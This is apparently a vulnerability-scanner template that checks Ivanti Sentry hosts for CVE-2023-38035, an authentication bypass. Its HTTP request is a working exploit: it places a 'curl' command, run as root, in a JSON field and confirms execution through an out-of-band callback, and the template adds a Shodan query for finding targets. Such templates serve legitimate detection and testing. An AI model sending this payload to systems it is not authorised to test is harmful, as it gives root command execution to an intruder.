id: CVE-2023-38035

info:
  name: Ivanti Sentry Authentication Bypass
  author: DhiyaneshDk
  severity: critical
  description: |
    A security vulnerability in MICS Admin Portal in Ivanti MobileIron Sentry versions 9.18.0 and below, which may allow an attacker to bypass authentication controls on the administrative interface due to an insufficiently restrictive Apache HTTPD configuration.
  reference:
    - https://forums.ivanti.com/s/article/CVE-2023-38035-API-Authentication-Bypass-on-Sentry-Administrator-Interface
    - https://www.horizon3.ai/ivanti-sentry-authentication-bypass-cve-2023-38035-deep-dive/
    - https://github.com/horizon3ai/CVE-2023-38035
    - https://nvd.nist.gov/vuln/detail/CVE-2023-38035
  metadata:
    max-request: 1
    shodan-query: 'html:"Note: Requires a local Sentry administrative user"'
    verified: true
  tags: cve,cve2023,ivanti,mobileiron,sentry,kev,rce,auth-bypass

http:
  - raw:
      - |
        POST /mics/services/MICSLogService HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"command": "curl {{interactsh-url}}", "isRoot": true}

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the HTTP Interaction
        words:
          - "http"

      - type: status
        status:
          - 500
